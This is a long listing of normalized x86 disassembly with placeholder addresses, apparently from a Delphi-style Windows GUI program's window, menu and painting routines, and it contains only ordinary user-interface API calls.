mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_466cdb
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c190
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_44d760
sub_466d67
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_465f2c
mov ecx edi
mov edx esi
mov eax ebx
call sub_4538e0
mov eax ebx
call sub_466e50
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_423cc8
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_423ce4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44d07c
mov ebp eax
push edi
push esi
mov eax ebx
call sub_44d038
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4670f8
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_467128
sub_466df4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_453e1c
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_469154
push eax
push 0x1
push 0x80
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
pop ebx
retn
sub_466e88
push ebx
mov ebx eax
mov eax ebx
call sub_467da4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_466f1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453e1c
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_453ee4
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_453e1c
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_453e1c
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_466fa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_4543c0
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_420fec
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420fc0
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403370
test al al
jne r-xdata
sub_467010
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4030bc
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46703c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax ebp
call sub_450b4c
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_420fec
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_454408
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_420fc0
mov si 0xfff1
call sub_403370
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_420ffc
jmp r-xdata
sub_4670d0
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44d81c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44e7e8
sub_4670f8
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44d050
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_467128
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44d094
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_467158
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_44d554
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_468290
pop esi
pop ebx
retn
sub_46719c
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_4671f5
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4671fc
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
sub_467204
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d508
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_451374
mov eax ebx
call sub_451510
sub_46723c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_420e38
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_46727c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451830
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403370
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403370
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44e7e8
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_460928
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_467ba8
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4674f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4674d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_424af0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424990
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_461e10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4674df
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424af0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_460928
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_467ba8
call sub_453e1c
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_467623
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4675fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4675df
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_424af0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424990
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4675e6
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424af0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_453e1c
mov esi eax
sub_467603
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ReleaseDC
retn
sub_4676b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_467700
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_467bdc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_467c28
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_467740
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_46790e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424244
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_451ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_44d178
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44bf70
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_4676b4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424244
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_467bdc
test eax eax
je r-xdata
push ebp
call sub_4676b4
pop ecx
push ebp
call sub_4676b4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_467700
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_4648ec
jmp r-xdata
sub_467920
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_465af0
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_46798c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_46618c
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax ebx
call sub_420fec
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_453e1c
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_450c40
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_453e1c
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_420fc0
call sub_46146c
mov edx esi
mov eax ebx
call sub_420fc0
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
sub_467a24
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_467aa1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_467aac
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4513bc
sub_467ad8
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_4513bc
xor edx edx
jmp r-xdata
mov eax esi
call sub_465c6c
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_467b10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_44ce38
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_4513bc
sub_467b54
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_44cf44
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_467ba8
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_44a514
sub_467bdc
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46b74c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_46b738
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_467c28
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46b74c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46b738
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_467c78
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_41814c
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_467ca8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_453e1c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_46b71c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_46b71c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_467c78
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_46b71c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46b708
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4182a8
call sub_403174
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46b708
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46b708
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46b708
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_467dac
push ebx
mov ebx eax
mov eax ebx
call sub_467da4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_428b34
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_467dd4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_451374
mov dl 0x1
mov eax esi
call sub_468138
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_4681b4
mov edx eax
mov eax esi
call sub_44d7d4
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_451510
mov dl 0x1
mov eax esi
call sub_467158
sub_467e54
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_453e1c
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_45da68
mov edi eax
mov eax ebp
call sub_453e1c
push eax
call DrawMenuBar
sub_467ed0
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_420a98
xor edx edx
mov eax ebx
call sub_45f400
sub_467ef4
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_467e54
mov eax edx
mov edx ebx
call sub_420a98
sub_467f1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4680e2
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46b74c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_460fb4
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
